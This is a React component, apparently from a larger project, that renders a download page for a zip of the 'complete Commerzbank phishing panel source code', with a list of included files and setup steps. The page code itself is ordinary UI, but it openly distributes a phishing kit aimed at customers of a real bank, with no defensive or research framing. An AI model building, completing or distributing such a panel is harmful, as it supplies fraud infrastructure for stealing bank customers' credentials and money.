import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Download } from "lucide-react";

export default function DownloadPage() {
  const handleDownload = () => {
    // Direct download from server endpoint
    window.location.href = '/download-project';
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-6">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <CardTitle className="text-2xl font-bold text-gray-900">
            Download Project Files
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="text-center">
            <div className="text-6xl mb-4">📦</div>
            <p className="text-gray-600 mb-6">
              Download the complete Commerzbank phishing panel source code as a zip file.
            </p>
          </div>

          <Button
            onClick={handleDownload}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white"
            size="lg"
          >
            <Download className="h-5 w-5 mr-2" />
            Download ZIP File
          </Button>

          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <h3 className="font-medium text-blue-900 mb-2">What's included:</h3>
            <ul className="text-sm text-blue-800 space-y-1">
              <li>• Complete source code (client & server)</li>
              <li>• Database schema and configuration</li>
              <li>• All React components and styling</li>
              <li>• Package.json with all dependencies</li>
              <li>• Setup and configuration files</li>
            </ul>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
            <h3 className="font-medium text-yellow-900 mb-2">Setup Instructions:</h3>
            <ol className="text-sm text-yellow-800 space-y-1">
              <li>1. Extract the ZIP file</li>
              <li>2. Run: npm install</li>
              <li>3. Set up PostgreSQL database</li>
              <li>4. Add DATABASE_URL to .env file</li>
              <li>5. Run: npm run db:push</li>
              <li>6. Start with: npm run dev</li>
            </ol>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}